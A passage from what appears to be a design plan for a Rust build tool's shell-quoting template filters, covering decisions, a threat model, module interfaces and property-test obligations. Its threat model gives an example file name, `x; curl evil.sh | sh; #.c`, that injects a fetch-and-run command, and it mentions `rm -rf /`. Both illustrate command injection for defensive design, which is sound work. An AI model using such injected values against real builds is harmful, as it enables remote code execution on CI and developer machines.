  keys. Both helpers therefore accept only `ValueKind::Seq` and
  `ValueKind::Iterable`; every other kind, `Map`, `String`, `None`, and
  `Undefined` included, raises an error naming the received kind. `uniq` and
  `flatten` share the latent wart; fixing them is out of scope, but it is not a
  licence to add two more, one of which builds shell text. Date/Author:
  2026-09-09, after contract review.
- **Decision D9**: every new diagnostic carries a machine-readable code in its
  Fluent text: `[netsuke::jinja::shell::args]` for a wrong call, and
  `[netsuke::jinja::shell::unquotable]` for a value a recipe cannot carry.
  Rationale: `locales/en-GB/messages.ftl:342-346` already carries
  `[netsuke::jinja::which::args]` inside the message, and `locales/fr` keeps it
  verbatim while translating the prose. It is the crate's only locale-stable
  handle for a template diagnostic, and `tests/features/stdlib.feature:104-106`
  proves the suite switches locale. The first draft's behavioural scenarios
  asserted on untranslated English (`"line feed"`), which would fail in
  thirty-two of the thirty-five catalogues. The split matters: `::args` means
  the template is wrong, and `::unquotable` means the template is right but its
  data cannot be carried — different fixes, often by different people. Do
  **not** copy `with_not_found_code` (`src/stdlib/which/mod.rs:235-237`), which
  prefixes the code in Rust *and* in the Fluent text; the snapshot at
  `tests/snapshots/which_diagnostic_snapshot_tests__which_not_found.snap:5`
  shows it emitted twice. The code lives in the message text only. Date/Author:
  2026-09-09, after contract review.
- **Decision D10**: `dialect='sh'` names an *encoding*, not a shell. Its output
  is fixed and will not change when further dialects are added. The dialect
  selected when `dialect` is *omitted* is a host- and configuration-dependent
  default that MAY change between Netsuke releases — in particular
  `RecipeShell::Bash` maps to `sh` today (D3) and would map to a future `bash`
  dialect. A manifest whose generated text must be byte-stable across releases
  and hosts must pin `dialect=` explicitly. Rationale: this is the one axis of
  the template surface with no versioning story, and it is invisible: no
  manifest edit, no version bump, different `build.ninja`. Naming it is cheaper
  than discovering it. Date/Author: 2026-09-09, after contract review.
- **Decision D11 (alternative considered and not adopted)**: ship
  `shell_quote`/`shell_join` with **no** `dialect` argument, always following
  the active recipe shell. Rationale for considering it: every comparable tool —
  `shlex.quote`, `shlex.join`, Just's `quote()`, bazel-skylib's `shell.quote`,
  Nix's `escapeShellArg`, Ansible's `quote` — ships a one-argument function
  with no dialect selector. Dropping it would remove four of the six message
  keys (roughly 140 catalogue lines), remove `ShellDialect::parse`, remove
  OBL-DIALECT-TOTAL, and remove the name collision with ADR-019's shell
  registry, which accepts `bash` where D3 rejects it. It would also make RFC
  0006's wider dialect set *easier* to add later, since an optional keyword on
  a zero-argument filter is purely additive. Rationale for not adopting it: the
  requester chose the two-dialect surface explicitly, and `RFC-0006-8.9` plus
  `RM-6.8.3` both specify the `dialect` argument by name. Dropping it would be
  a second deviation on top of D2. The plan instead adopts the safety half of
  the argument: the documented example and every snapshot pin `dialect`
  explicitly (R4), D10 records that the omitted-dialect default is unstable,
  and EP-M4 closes the mismatch that made the argument dangerous. Reopening
  condition: if the requester prefers the smaller surface at approval time,
  EP-M3 and EP-M4 shrink by roughly forty per cent and R1 drops from high to
  low likelihood. This decision is cheap to reverse before EP-M4 and expensive
  afterwards, because the template surface becomes documented and executed at
  EP-M5. Date/Author: 2026-09-09, after alternatives review.
- **Decision D12**: `shell_quote` and `shell_join` are *safe primitives*, not
  enforced controls, and the plan says so rather than repeating `DD-4.5`'s
  "non-negotiable security feature" unqualified. See "Threat model" below.
  Date/Author: 2026-09-09, after contract review.

## Threat model

`DD-4.5` calls the quoting filter "a non-negotiable security feature to prevent
command injection vulnerabilities". That phrase needs qualifying before it is
repeated, because a security property requires an attacker and no document in
this repository names one.

**The attacker is not the manifest author.**
`docs/stdlib-yaml-and-jinja-guide.md:89,296,374` is unambiguous that
host-observing helpers belong only in trusted manifests. An author who wants
arbitrary execution writes `command: rm -rf /`. `shell_quote` defends against
nothing there.

**The attacker is whoever controls a value a trusted manifest reads and
interpolates.** Netsuke gives a manifest at least seven such channels, every
one of them lower-trust than the manifest itself:

| Channel                               | Who controls the value                                 |
| ------------------------------------- | ------------------------------------------------------ |
| `env('X')`                            | whoever sets CI job variables or the developer's shell |
| `glob('src/*.c')`                     | anyone who can add a file to the checkout              |
| `contents(...)`, `size`, `linecount`  | whoever wrote the file                                 |
| `fetch(url)`                          | the remote server, or anyone who can poison it         |
| `value \| shell(cmd)`, `\| grep(...)` | whatever the subprocess prints                         |
| `which('tool')`                       | whoever can plant a `PATH` entry                       |

The realistic attack: a contributor opens a pull request adding a file named
`x; curl evil.sh | sh; #.c`; the manifest does
`command: cc {{ glob('src/*.c') | join(' ') }}`; continuous integration builds
the pull request. Interpolated *paths* are already covered — `quote_path` quotes
`{{ ins }}` and `{{ outs }}`. `shell_quote` extends that guarantee to the
other six channels, which today have nothing.

**What this plan delivers, honestly.**

- For `dialect='sh'`, a sound encoder, with unusually good evidence:
  OBL-SH-ROUNDTRIP runs a real `/bin/sh` and has a stated negative control, and
  the encoding composes correctly with ADR-014's `$`-doubling at the Ninja
  writer boundary.
- For `dialect='powershell'` on a non-Windows host, one class weaker: the
  guarantee rests on a hand-written inverse model until the Windows job runs.
  ADR-021 must say so in those words.
- **It is opt-in and silent when omitted.** Nothing detects
  `command: cc {{ glob(...) | join(' ') }}` and warns. A control that works
  only when the author remembers it is a primitive, not a control.
- **It does not cover the command or option position.**
  `{{ tool | shell_quote }} {{ user_flags }}` is still injectable through
  `user_flags`. The guide must not let an author believe that quoting one
  substitution makes a recipe safe.

The claim to write in ADR-021 and in "Validation and acceptance", replacing any
unqualified repetition of `DD-4.5`:

> `shell_quote` and `shell_join` are safe primitives, not enforced controls.
> They give a manifest author a sound way to interpolate a value into a shell
> recipe as exactly one inert word. The threat they address is a trusted
> manifest interpolating an attacker-influenced value. The manifest itself
> remains trusted input; nothing here defends against a hostile `Netsukefile`.
> The soundness of the encoder is non-negotiable; its application is the
> author's responsibility. A lint that flags an unquoted interpolation of a
> host-observing helper's result into a recipe is deliberately out of scope and
> should be raised as a separate roadmap item.

## Interfaces and dependencies

Be prescriptive. At the end of this work the following must exist.

### `src/shell_word.rs` (new leaf)

The encoder does **not** go into `src/recipe_shell.rs`. That module's own doc
comment calls it "intentionally below both IR lowering and Ninja rendering" and
"data-only": it is the shared vocabulary type three layers agree on, and giving
it a `shell_quote` dependency would change its character. Instead add a leaf
that both `src/ir/` and `src/stdlib/` may depend on, and leave `recipe_shell`
pure:

```rust
//! Encode one string as a single shell word for a named dialect.

/// The shell dialect a word is encoded for.
#[derive(Clone, Copy, Debug, Eq, PartialEq)]
pub(crate) enum ShellDialect {
    /// POSIX `sh` word quoting, also correct for Bash and Z Shell.
    Sh,
    /// Windows PowerShell single-quoted string quoting.
    PowerShell,
}

impl ShellDialect {
    /// Every dialect, in the order errors enumerate them.
    pub(crate) const ALL: &'static [Self] = &[Self::Sh, Self::PowerShell];

    /// Return the `dialect` keyword-argument spelling of this dialect.
    pub(crate) const fn as_str(self) -> &'static str;

    /// Parse one `dialect` keyword argument, case-insensitively.
    ///
    /// Deliberately rejects `bash`. See decision D3: `RecipeShell::Bash` maps
    /// to `Sh` because `Sh` output is valid Bash, but the `shell-quote` crate's
    /// `Bash` encoder emits a different `$'...'` form that Netsuke does not
    /// compile in. Accepting the name now would lock in a meaning a real
    /// `bash` dialect would have to break.
    pub(crate) fn parse(raw: &str) -> Option<Self>;
}

/// Encode `value` as one shell word for `dialect`, without validating it.
///
/// This function is total: the caller owns the question of which inputs a
/// recipe may carry. `quote_path` depends on that split to keep its existing
/// total behaviour.
pub(crate) fn quote_word(dialect: ShellDialect, value: &str) -> String;
```

`ALL`, `as_str`, and `parse` derive from one another, so adding a third dialect
is a one-line enum change rather than an edit at every use site.

`quote_word`'s body is moved verbatim from
`src/ir/cmd_interpolate/mod.rs::quote_path`, generalized from `&Utf8PathBuf` to
`&str`.

### `src/recipe_shell.rs`

Stays a single file and stays data-only. It gains exactly one method, so that
the mapping lives with the type that knows about all three interpreters:

```rust
/// Return the dialect whose quoting rules this interpreter follows.
///
/// `Posix` and `Bash` share `Sh`: they differ in transport, not in lexis.
pub(crate) const fn dialect(self) -> ShellDialect;
```

There is deliberately **no** inverse. `RecipeShell -> ShellDialect` is a
three-to-two surjection, so a `ShellDialect::recipe_shell` would have to pick
one of `Posix`/`Bash` arbitrarily and its doc comment could not be truthful.
`src/stdlib/` never names `RecipeShell`; every edge points downward into
`shell_word`.

### `src/stdlib/recipe_text/` (new)

Not `src/stdlib/shell/`. `src/stdlib/command/` already registers a template
filter literally named `shell` (`src/stdlib/command/mod.rs:81-111`) and already
contains a `quote.rs`. A sibling `shell/` module holding `shell_quote` would
invert the naming at both ends: a contributor grepping `stdlib/shell` for the
`shell` filter would find text quoting, and grepping `stdlib/command` for
`shell_quote` would find `cmd.exe` quoting. Name the module for what it
produces.

In the same milestone, rename `src/stdlib/command/quote.rs` to
`child_argument.rs` and its `quote` function to `quote_child_argument`. Both are
`pub(super)` with a single consumer (`format_command` in
`src/stdlib/command/filters.rs:126-149`), so the rename is free and it removes
the last bare `quote` in the subtree.

`src/stdlib/recipe_text/mod.rs`:

```rust
/// Register the pure recipe-text filters on an environment.
pub(crate) fn register_filters(env: &mut Environment<'_>, default: ShellDialect);
```

It registers exactly two filters:

- `value | shell_quote(dialect=<name>)`
- `values | shell_join(dialect=<name>)`

Both read `dialect` with `kwargs.get::<Option<String>>("dialect")?`, fall back
to `default`, and finish with `kwargs.assert_all_used()?`, matching the
ordering in `src/stdlib/which/mod.rs:82-92`.

Both call the shared admissibility predicate before encoding — see the next
subsection — and then `shell_word::quote_word`. `shell_join` joins the encoded
words with one space.

### Control characters: reuse, do not reimplement

The first draft of this plan proposed a `policy.rs` owning a "rejects `\0`,
`\r`, `\n`" rule. That rule already exists: `src/ninja_gen_escape.rs:43-48`:

```rust
/// Reject text that cannot remain within one Ninja binding.
pub(super) fn validate_ninja_value(text: &str) -> Result<(), NinjaGenError> {
    if text.contains(['\n', '\r', '\0']) {
        return Err(NinjaGenError::UnsafeNinjaValue);
    }
    Ok(())
}
```

`docs/adr-014-backend-text-escaping-seam.md` records it as the Ninja writer's
own admissibility rule. Reimplementing it inside a template filter would put
one predicate at three enforcement points, and they have **already** drifted:
`src/stdlib/command/quote.rs:43` rejects `\n` and `\r` but not `\0`.

Instead, promote the predicate to a shared leaf and call it from both places.
Add to `src/shell_word.rs`:

```rust
/// Report whether `value` can survive as part of a single-line recipe.
///
/// Newline, carriage return, and NUL cannot: a Ninja binding is single-line by
/// construction. This is the same rule the Ninja writer enforces at its own
/// boundary; see ADR-014.
pub(crate) fn is_recipe_admissible(value: &str) -> bool { !value.contains(['\n', '\r', '\0']) }
```

`validate_ninja_value` becomes a caller of it. The template filters call it and
raise the localized `stdlib.shell.quote.control_character` diagnostic, so an
author gets an error naming their expression rather than a backend-attributed
one. `src/stdlib/command/quote.rs`'s narrower rule is left alone and its
divergence documented, because a `cmd.exe` argument is not recipe text.

This removes the `QuotePolicyError` type and one of the five message keys was
already going to be needed for it, so the key count is unchanged.

### Enforcing "exactly one implementation"

Constraint 4 is currently prose. Make it a gate. `shell_quote::QuoteRefExt` is
imported at exactly two sites today (`src/ir/cmd_interpolate/mod.rs:12` and
`src/stdlib/command/quote.rs:6`), and `clippy.toml:15-24` already uses
`disallowed-methods` with reason strings to enforce the ADR-008 environment
mandate, with sanctioned sites carrying
`#[expect(clippy::disallowed_methods, reason = "...")]` so the exemption warns
once it becomes obsolete. Add one entry:

```toml
{ path = "shell_quote::QuoteRefExt::quoted", reason = "recipe-shell word quoting lives in shell_word::quote_word" },
```

with one `#[expect(...)]` in `src/shell_word.rs` and one in
`src/stdlib/command/child_argument.rs`, whose divergence is deliberate. One
line of configuration turns an aspiration into a check, using machinery the
repository already trusts.

### `src/stdlib/collections.rs`

`register_filters` gains one line, and the file gains two functions:

```rust
env.add_filter("compact", |values: Value| compact_filter(&values));

/// Report whether a member is dropped by `compact`.
///
/// Only `none`, undefined, and the empty string are blank. `0`, `false`, `[]`,
/// `{}`, and a whitespace-only string are values and are retained; naming the
/// predicate keeps that asymmetry visible to the next reader.
fn is_blank(value: &Value) -> bool;

/// Drop blank members from a sequence, preserving order.
///
/// # Errors
///
/// Returns an error naming the received kind when the subject is not a
/// sequence. See decision D8: `Value::try_iter()` is not a sequence check.
fn compact_filter(values: &Value) -> Result<Value, Error>;
```

`src/stdlib/collections.rs` is 314 lines today, so `compact` fits. If it would
exceed 400, convert it to a directory module with
`src/stdlib/collections/compact.rs`.

### `src/stdlib/config/mod.rs`

The configuration stores the **dialect**, not the interpreter. `StdlibConfig`
does not care which interpreter runs the recipe; it cares which quoting rule to
apply, and `RecipeShell` is a three-variant type that would be collapsed to two
immediately. Storing the wider type would leave a `recipe_shell()` accessor
inviting a question the configuration can no longer answer honestly, because
`Posix` and `Bash` are indistinguishable downstream.

```rust
/// Shell dialect the recipe-text filters quote for.
dialect: ShellDialect,

/// Select the recipe interpreter whose quoting rules the filters follow.
///
/// The interpreter is collapsed to its dialect on the way in: `Posix` and
/// `Bash` both quote as `sh`. Only the dialect is stored, because nothing
/// downstream can distinguish the two.
#[must_use]
pub fn with_recipe_shell(mut self, shell: RecipeShell) -> Self {
    self.dialect = shell.dialect();
    self
}

/// Return the dialect the recipe-text filters quote for.
pub(crate) const fn dialect(&self) -> ShellDialect;
```

`StdlibConfig::new` initializes it to `RecipeShell::host_default().dialect()`.

`RecipeShell` is already publicly nameable — `src/lib.rs:27` declares
`pub mod recipe_shell;` and the enum is `pub` — so `with_recipe_shell` needs no
visibility widening, and `ShellDialect` stays `pub(crate)`. Taking
`RecipeShell` as the *parameter* also keeps the interpreter-to-dialect mapping
in one place rather than pushing it out to every caller.

### `src/stdlib/register.rs`

- `register_read_only_helpers` calls
  `recipe_text::register_filters(env, config.dialect())`.
- `register_query_helpers` calls
  `recipe_text::register_filters(env, RecipeShell::host_default().dialect())`.

  **Known divergence, deliberately accepted.** On a Windows host with
  `NETSUKE_WINDOWS_SHELL=bash`, the build surface receives the resolved dialect
  while the query surface receives the host default, so `netsuke help targets`
  renders different quoting from the build for the same expression. Query
  rendering is discovery metadata and is never executed, so the divergence is
  harmless — but it must be pinned by an assertion in
  `tests/stdlib_manifest_query_tests.rs` and recorded in
  `docs/developers-guide.md`, not discovered later. The alternative — hoisting
  `resolve_recipe_shell()` above the early return at `src/runner/mod.rs:145` —
  would make `netsuke help targets` fail on a Windows host with a malformed
  `NETSUKE_WINDOWS_SHELL`, which is a worse trade.

- The disabled `env` stub changes to:

  ```rust
  env.add_function(
      "env",
      |_variable: String, _kwargs: Kwargs| -> Result<String, Error> {
          Err(manifest_query_operation_error("env"))
      },
  );
  ```

### `src/manifest/mod.rs` — and a file-size problem to solve first

**`src/manifest/mod.rs` is exactly 400 lines today.** Constraint 8 caps files
at 400, so EP-M1 has zero headroom and its first edit breaches the cap.

Extract first, then edit. Move `RESERVED_VAR_NAMES`, `localize_recipe_error`,
`register_manifest_vars`, and `manifest_structure_error` into a new
`src/manifest/registration.rs`, then add the `env` and `glob` registrations
there too. Use exactly that module name and that member set: the in-flight
branch `issue-651-add-resource-budgets-to-manifest-template-evaluation` already
creates `src/manifest/registration.rs` with the same four members, so matching
it turns a near-certain rebase conflict into a clean merge. See R9.

The registration itself, in `src/manifest/registration.rs`:

```rust
let reader = Arc::clone(env_reader);
jinja.add_function("env", move |var_name: String, kwargs: Kwargs| {
    let fallback = env_default_from_kwargs(&kwargs)?;
    kwargs.assert_all_used()?;
    env_var_with_default(&var_name, fallback, |key| reader(key))
});
```

```rust
/// Read the optional `default` keyword argument as a string.
///
/// Reads `Option<Value>` rather than `Option<String>` because MiniJinja's
/// `Option<String>` conversion silently stringifies numbers, booleans,
/// sequences, and mappings. See decision D4.
///
/// # Errors
///
/// Returns an error for an undefined or non-string `default`. An explicit
/// `none` is equivalent to omitting the argument.
fn env_default_from_kwargs(kwargs: &Kwargs) -> Result<Option<String>, Error>;
```

### `src/manifest/env_reader.rs`

```rust
/// Read one environment variable, substituting `fallback` only for absence.
///
/// # Errors
///
/// Returns an `UndefinedError` when the variable is absent and `fallback` is
/// `None`, and an `InvalidOperation` error when the value is not valid UTF-8 —
/// the latter regardless of `fallback`, because a present-but-undecodable value
/// is a configuration fault, not an absence.
pub(super) fn env_var_with_default(
    name: &str,
    fallback: Option<String>,
    read_env: impl FnOnce(&str) -> Result<String, EnvReadError>,
) -> Result<String, Error>;
```

On the substitution path it emits, mirroring the existing failure-path logging
at `src/manifest/env_reader.rs:92,101` and naming neither the variable nor the
value:

```rust
tracing::debug!(fallback_used = true, "manifest env lookup substituted default");
```

Without it, a continuous-integration job whose `RUSTFLAGS` export silently
stops propagating goes from failing fast to building the wrong artefact with no
record anywhere that a default was taken. See R10.

`env_var_with` is **removed**, not kept as an alias (constraint 7); its two
existing call sites become `env_var_with_default(name, None, read_env)`.

### New localization keys

Every diagnostic carries its machine-readable code in the Fluent text, per D9
and matching `locales/en-GB/messages.ftl:342-346`. Added to
`src/localization/keys.rs` in the `STDLIB_*` group, after the `COMMAND_*` block:

```rust
STDLIB_SHELL_ARGS_ERROR => "stdlib.shell.args_error",
STDLIB_SHELL_UNQUOTABLE => "stdlib.shell.unquotable",
STDLIB_SHELL_QUOTE_NOT_STRING => "stdlib.shell.quote.not_string",
STDLIB_SHELL_QUOTE_CONTROL_CHARACTER => "stdlib.shell.quote.control_character",
STDLIB_SHELL_DIALECT_INVALID => "stdlib.shell.dialect_invalid",
STDLIB_SHELL_JOIN_NOT_SEQUENCE => "stdlib.shell.join.not_sequence",
STDLIB_SHELL_JOIN_ITEM_NOT_STRING => "stdlib.shell.join.item_not_string",
STDLIB_SHELL_POSITIONAL_OPTION => "stdlib.shell.positional_option",
STDLIB_COLLECTIONS_COMPACT_NOT_SEQUENCE
    => "stdlib.collections.compact.not_sequence",
MANIFEST_ENV_ARGS_ERROR => "manifest.env.args_error",
MANIFEST_ENV_DEFAULT_NOT_STRING => "manifest.env.default_not_string",
```

English text (`locales/en-GB/messages.ftl` and `locales/en-US/messages.ftl`):

```text
stdlib.shell.args_error = [netsuke::jinja::shell::args] { $details }
stdlib.shell.unquotable = [netsuke::jinja::shell::unquotable] { $details }
stdlib.shell.quote.not_string = shell_quote expects a string, received { $kind }.
stdlib.shell.quote.control_character = A value containing a null byte, carriage return, or line feed cannot be quoted.
stdlib.shell.dialect_invalid = Unknown shell dialect { $dialect }; expected one of { $accepted }.
stdlib.shell.join.not_sequence = shell_join expects a sequence, received { $kind }.
stdlib.shell.join.item_not_string = shell_join item { $index } is { $kind }, not a string.
stdlib.shell.positional_option = { $filter } takes its options by keyword; write { $example }.
stdlib.collections.compact.not_sequence = compact expects a sequence, received { $kind }.
manifest.env.args_error = [netsuke::jinja::env::args] { $details }
manifest.env.default_not_string = env default must be a string, received { $kind }.
```

The first two are wrappers; the rest are details fed through them as
`{ $details }`, exactly as `stdlib.which.cwd_mode_invalid` feeds
`stdlib.which.args_error` through `args_message`
(`src/stdlib/which/mod.rs:262-266`). `stdlib.shell.unquotable` wraps the
control-character detail; every other shell detail wraps
`stdlib.shell.args_error`, and the `env` detail wraps
`manifest.env.args_error`. The existing `manifest.env.missing` and
`manifest.env.invalid_utf8` messages are **not** given codes: constraint 1
freezes their rendered text.

The `{ $variable }` name set must be identical in all 35 catalogues; wording
and order may differ, but the bracketed code must be copied verbatim, as
`locales/fr/messages.ftl:343-347` does today. Follow
`docs/localization-styleguide.md`.

Eleven keys, not five. The first draft had five and was wrong on two counts: D4
and D8 each need a key the draft claimed to save, and D9 adds the two wrappers
that make the diagnostics locale-stable. Roughly 385 catalogue lines. See R1.

## Verification plan

Verification is co-designed with the implementation: the split between
`policy.rs` (whether a value may be quoted) and `quoting.rs` (how it is
encoded) exists precisely so the encoding obligation can be discharged against
a real shell while the policy obligation stays a cheap total function.

### Non-trivial axioms

- **AX-1**: `shell_quote::Sh` emits text that a POSIX `sh` decodes back to the
  input byte string. This is a third-party contract; it is *exercised*, not
  proven, by OBL-SH-ROUNDTRIP running a real `/bin/sh`.
- **AX-2**: Windows PowerShell decodes a single-quoted string by collapsing each
  `''` to `'` and treating every other character literally. Exercised against
  real `powershell.exe` only on Windows hosts; discharged against an explicit
  inverse model elsewhere. Residual gap recorded below.
- **AX-3**: `shlex::split` implements POSIX word splitting faithfully enough to
  serve as an oracle for "this text is exactly one word".
  `docs/formal-verification-methods-in-netsuke.md:277` records that whether
  `shlex::split` is part of the semantic acceptance contract or only a guard is
  an open question; this plan uses it only as a *test oracle*, alongside the
  real-shell round trip, never as the sole evidence.
- **AX-4 (corrected)**: MiniJinja's `Kwargs::get::<Option<Value>>` yields
  `None` for an absent key and a `Value` otherwise, distinguishing an explicit
  `none` and an explicit undefined by `Value::is_none`/`is_undefined`;
  `assert_all_used` rejects unconsumed *keyword* arguments with a message
  containing "unknown keyword argument". A trailing **positional** argument is
  different: it yields a bare `TooManyArguments` with **no detail**, naming
  neither the filter nor the expected keyword. The first draft assumed
  `Option<String>` raises on a type mismatch; it does not, it stringifies (D4).
  All three behaviours are exercised: the unknown-keyword case, the
  non-string-`default` case, and the positional case.
- **AX-5**: A Ninja `command =` value is single-line, so rejecting `\r` and `\n`
  loses no expressible manifest.

Verus is not used: `docs/roadmap.md:428-433` records the accepted phase-1
boundary that Verus is "optional and proof-kernel-only". Kani is not used
either: the invariants below are over unbounded UTF-8 strings, where a bounded
model checker would explore a strictly weaker domain than the property tests,
and the strongest available evidence — differential execution against the real
`/bin/sh` — is outside any model checker's reach. Both exclusions are choices,
not omissions.

### Obligations

**OBL-SH-ROUNDTRIP** — POSIX quoting is faithful.

- Obligation: for every `s` containing no `\0`, `\r`, or `\n`, running
  `sh -c 'printf %s ' + quote_for_recipe(Sh, s)` writes exactly `s` to stdout.
- Method: property test executing a real `/bin/sh` subprocess, `#[cfg(unix)]`.
- Rationale: this is the only method that tests the actual composition of
  Netsuke's policy layer with the third-party encoder and a real shell. A pure
  unit test would restate `shell-quote`'s own tests.
- Domain: a `proptest` string strategy deliberately biased toward shell
  metacharacters. Draw characters from an explicit alphabet containing ASCII
  letters, digits, space, tab, the single quote, the double quote, the dollar
  sign, the backtick, the backslash, the asterisk, the question mark, the
  semicolon, the ampersand, the vertical bar, the angle brackets, the round,
  square, and curly brackets, the hash, the tilde, and the exclamation mark,
  plus a slice of non-ASCII UTF-8. Lengths run from zero to twenty-four
  characters, filtered only for the three forbidden control characters.
- Artefact: `tests/shell_filter_property_tests.rs`.
- Evidence: `cargo nextest run --test shell_filter_property_tests`. Before
  `quote_for_recipe` exists the test fails to compile; after a naive
  implementation it must fail on the first metacharacter case.
- Non-vacuity: the strategy is classified with `proptest`'s
  `prop_assume!`-free design plus an explicit assertion that, across a fixed
  seeded run, at least one generated case contained a single quote, at least
  one contained a dollar sign, and at least one contained a space — asserted by
  a companion deterministic test over a hand-written witness table so the
  property cannot pass vacuously on an all-alphanumeric sample. **Negative
  control**: a sibling `#[test]` applies a deliberately broken quoter (wrap in
  `"` only) to the witness `$HOME 'x'` through the same subprocess harness and
  asserts the harness *rejects* it. If that control ever passes, the harness is
  not measuring anything and the obligation is undischarged.

**OBL-PS-ROUNDTRIP** — PowerShell quoting is faithful.

- Obligation: for every `s` containing no `\0`, `\r`, or `\n`,
  `decode_powershell_single_quoted(quote_for_recipe(PowerShell, s)) == s`.
- Method: property test against an explicit inverse model, plus a
  `#[cfg(windows)]` real-`powershell.exe` round trip of the same shape.
- Rationale: CI for this repository runs Linux and Windows. On Linux the model
  is the only available oracle; on Windows the real interpreter discharges AX-2
  directly.
- Domain: the same string strategy as OBL-SH-ROUNDTRIP.
- Artefact: `tests/shell_filter_property_tests.rs`.
- Evidence: the Linux run proves model conformance; the Windows CI job proves
  the model matches the interpreter.
- Non-vacuity: the model must be written as a *decoder* (strip the outer quotes,
  collapse `''`), never by calling the encoder. A negative control feeds the
  decoder a string quoted with the POSIX encoder and asserts it does **not**
  round-trip.
- Residual gap: on a non-Windows host, AX-2 rests on the model. Stated here
  rather than hidden.

**OBL-ONE-WORD** — a quoted value is exactly one shell word.

- Obligation: for every admissible `s`,
  `shlex::split(&quote_for_recipe(Sh, s)?) == Some(vec![s.to_owned()])`.
- Method: property test (pure, no subprocess), `cases: 128`.
- Rationale: this is the literal claim `RM-3.14.8` makes — "optional
  `RUSTFLAGS` construction without shell parameter expansion". It is also the
  property the IR's own `shlex` guard depends on.
- Domain: as above, plus the empty string as an explicit boundary witness.
- Artefact: `tests/shell_filter_property_tests.rs`.
- Non-vacuity: an assertion that `shlex::split` returns two or more words for
  the *unquoted* form of at least one witness (`a b`), proving the oracle
  distinguishes quoted from unquoted.

**OBL-JOIN-SPLIT** — `shell_join` is the inverse of word splitting.

- Obligation: for every list `xs` of admissible strings,
  `shlex::split(&join_for_recipe(Sh, xs)?) == Some(xs)`.
- Method: property test, `cases: 128`.
- Domain: `prop::collection::vec(word_strategy(), 0..6)`, including the empty
  list (which must yield the empty string) and lists containing empty strings.
- Artefact: `tests/shell_filter_property_tests.rs`.
- Non-vacuity: classify and assert that the sample includes at least one list
  with an element containing a space and at least one with an empty element;
  negative control asserts a naive `xs.join(" ")` fails the same property.

**OBL-COMPACT** — `compact` is an order-preserving filter with a stable
predicate.

- Obligation: for every input sequence `xs`, `compact(xs)` (a) contains no
  `none`, undefined, or empty-string member; (b) is a subsequence of `xs`; (c)
  satisfies `compact(compact(xs)) == compact(xs)`; and (d) equals `xs` when
  `xs` contains no droppable member.
- Method: property test, `cases: 128`.
- Rationale: four connected invariants over an unbounded domain; a table test
  would not establish the subsequence or idempotence claims.
- Domain: a `prop_oneof!` strategy producing `Value::UNDEFINED`,
  `Value::from(())`, `Value::from("")`, `Value::from(0)`, `Value::from(false)`,
  and non-empty strings, collected into vectors of length 0..8.
- Artefact: `tests/std_filter_tests/collection_filters.rs`.
- Non-vacuity: assert that the generated sample contains at least one droppable
  and one retained member across the run, and add an explicit witness case for
  `[0, false, '', none, 'x']` yielding `[0, false, 'x']` — which fails
  immediately under a naive truthiness-based implementation. That naive
  implementation is the negative control.

**OBL-ENV-DEFAULT** — the default substitutes for absence only.

- Obligation: with an injected `EnvReader`, `env(n, default=d)` returns the
  variable's value when present (including when that value is `""`), returns
  `d` when absent, raises `UndefinedError` with the unchanged message when
  absent and `d` is omitted or `none`, and raises `InvalidOperation` with the
  unchanged message when the value is not UTF-8 *even when `d` is supplied*.
- Method: parameterized `rstest` over the finite five-case partition, plus the
  two existing `insta` snapshots re-run unchanged.
- Rationale: the domain is a genuinely finite partition of reader outcomes
  crossed with default presence; enumeration is exhaustive.
- Domain: `{present-nonempty, present-empty, absent, not-unicode}` ×
  `{no default, default=none, default='fallback'}`, minus the impossible
  combinations — 12 cases, all enumerated.
- Artefact: `tests/manifest_env_tests.rs` and
  `src/manifest/tests/env_function.rs`.
- Non-vacuity: the reader is an injected closure that records the key it was
  asked for, so a test asserting `default` was returned also asserts the reader
  was actually consulted — an implementation that returned `default` without
  reading fails. The unchanged `insta` snapshots are the negative control for
  diagnostic drift: any wording change fails them.

**OBL-DIALECT-TOTAL** — dialect selection is total and its error is truthful.

- Obligation: every `RecipeShell` variant maps to exactly one `ShellDialect`;
  every name in `ShellDialect::ACCEPTED` parses; every other name fails with an
  error naming the rejected value and enumerating exactly
  `ShellDialect::ACCEPTED`.
- Method: exhaustive parameterized test over the three-variant `RecipeShell`
  and the two-element `ACCEPTED` list, plus a test asserting the rendered error
  text contains every element of `ACCEPTED` and nothing else from a near-miss
  list (`bash`, `cmd`, `zsh`, `pwsh`).
- Rationale: the domain is finite and small; exhaustive enumeration is the
  strongest available evidence.
- Artefact: `src/stdlib/shell/dialect.rs` `#[cfg(test)] mod tests`.
- Non-vacuity: the near-miss list guarantees the "enumerates exactly" assertion
  can fail; `bash` in particular is the name D3 deliberately rejects.

**OBL-NINJA-STABLE** — extracting `quote_word` changes no generated output.

- Obligation: the Ninja text generated for every existing manifest fixture is
  byte-identical before and after EP-M3.
- Method: the existing `insta` snapshot suite under `tests/snapshots/ninja/`
  and `src/snapshots/`, re-run without re-acceptance.
- Artefact: existing.
- Evidence: `make test-nextest`, then
  `git status --short src/snapshots tests/snapshots` prints nothing.
- Non-vacuity: the suite already fails when generation changes — it caught the
  3.14.7 dollar-escaping work. To confirm it is live for this refactor,
  temporarily alter `quote_word` to emit a double quote instead of a single
  quote, observe at least one snapshot fail, then revert. Record the failing
  snapshot name in `Artefacts and notes`.

**OBL-NO-ESCAPE** — quoted output survives template rendering verbatim.

- Obligation: rendering `{{ value | shell_quote(dialect='sh') }}` through the
  manifest path emits the quoter's bytes unchanged, with no HTML or XML
  escaping applied, for values containing `&`, `<`, `>`, `"`, and `'`.
- Method: parameterized `rstest` rendering through the real manifest loader,
  asserting byte equality against the quoter's direct output.
- Rationale: `src/stdlib/register.rs::register_legacy_boolean_formatter`
  installs a formatter that delegates to `escape_formatter`, which honours the
  environment's auto-escape setting. MiniJinja's default auto-escape callback
  keys off the template name's extension, and
  `src/manifest/jinja_macros/invocation.rs:63` shows the codebase already
  branches on `AutoEscape::None`. Nothing in the plan guarantees the manifest
  path is never auto-escaping, and an escaped `&amp;` inside a recipe would be
  a silent corruption of the very output this feature exists to protect.
- Domain: the five HTML-significant characters, plus one witness combining
  them.
- Artefact: `tests/shell_filter_property_tests.rs`.
- Non-vacuity: the assertion compares against `quote_for_recipe`'s own output,
  so it fails if either side changes. Negative control: construct an
  environment with auto-escaping forced on and assert the same template *does*
  differ, proving the test can detect escaping at all.

**OBL-CONTEXT** — quoting is only correct in unquoted argv position.

- Obligation: rendering `{{ v | shell_quote(dialect='sh') }}` in unquoted
  position yields text a POSIX shell splits into one field equal to `v`;
  rendering the same filter *inside* an existing pair of double quotes yields
  text containing the quoter's literal quote characters, which is a manifest
